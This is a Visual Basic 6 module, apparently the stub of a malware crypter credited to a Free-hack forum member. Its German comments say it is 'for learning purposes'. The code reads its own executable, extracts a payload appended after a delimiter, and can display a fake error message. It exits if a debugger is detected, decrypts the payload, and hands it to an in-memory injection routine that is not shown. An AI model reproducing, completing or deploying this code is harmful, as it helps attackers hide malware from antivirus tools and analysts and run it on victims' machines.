Attribute VB_Name = "b"
'|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|
'|+Dieser Code ist f�r Lernzwecke|+|+|+|+|+|+|+|+|+|
'|+Keine billigen Ripps!+|+|+|+|+|+|+|+|+|+|+|+|+|+|
'|+Codet by The-Wall+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|
'|+Contact: via PM (Free-hack)+|+|+|+|+|+|+|+|+|+|+|
'|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|
Option Explicit
Const Abschluss = "{~|<(*)>|~}"
Dim Data As String
Dim DataFile() As String
Dim Code As String
Dim InjectionPath As String
Dim Loader() As Byte
Dim cCrypt  As New clscrypt
Sub Main()
Call SPL
DataFile() = Splitter(Data, Abschluss)
If DataFile(2) = "" Then
Else
MsgBox DataFile(2), vbCritical, "Fehler"
End If
If DataFile(3) = "ENABLE" Then
If IsDebuggerActive() = True Then End
End If
Code = cCrypt.DecryptString(DataFile(1), DataFile(4))
Loader = StrConv(Code, vbFromUnicode)
InjectionPath = ThisExe
Call Memory
End
End Sub
Private Function Splitter(ByVal Expression As String, Optional ByVal Delimiter As String, Optional ByVal Limit As Long = -1) As String()
Dim lLastPos As Long
Dim lIncrement As Long
Dim lExpLen As Long
Dim lDelimLen As Long
Dim lUbound As Long
Dim svTemp() As String
lExpLen = Len(Expression)
If Delimiter = vbNullString Then Delimiter = " "
lDelimLen = Len(Delimiter)
If Limit = 0 Then GoTo QuitHere
If lExpLen = 0 Then GoTo QuitHere
If InStr(1, Expression, Delimiter, vbBinaryCompare) = 0 Then GoTo QuitHere
ReDim svTemp(0)
lLastPos = 1
lIncrement = 1
Do
If lUbound + 1 = Limit Then
svTemp(lUbound) = Mid$(Expression, lLastPos)
Exit Do
End If
lIncrement = InStr(lIncrement, Expression, Delimiter, vbBinaryCompare)
If lIncrement = 0 Then
If Not lLastPos = lExpLen Then
svTemp(lUbound) = Mid$(Expression, lLastPos)
End If
Exit Do
End If
svTemp(lUbound) = Mid$(Expression, lLastPos, lIncrement - lLastPos)
lUbound = lUbound + 1
ReDim Preserve svTemp(lUbound)
lLastPos = lIncrement + lDelimLen
lIncrement = lLastPos
Loop
ReDim Preserve svTemp(lUbound)
Splitter = svTemp
Exit Function
QuitHere:
ReDim Splitter(-1 To -1)
End Function
Sub SPL()
Open App.Path + "\" + App.EXEName + ".exe" For Binary Access Read As #1
Data = String(LOF(1), vbNullChar)
Get #1, , Data
Close #1
End Sub
Sub Memory()
Call Final(InjectionPath, Loader)
End Sub
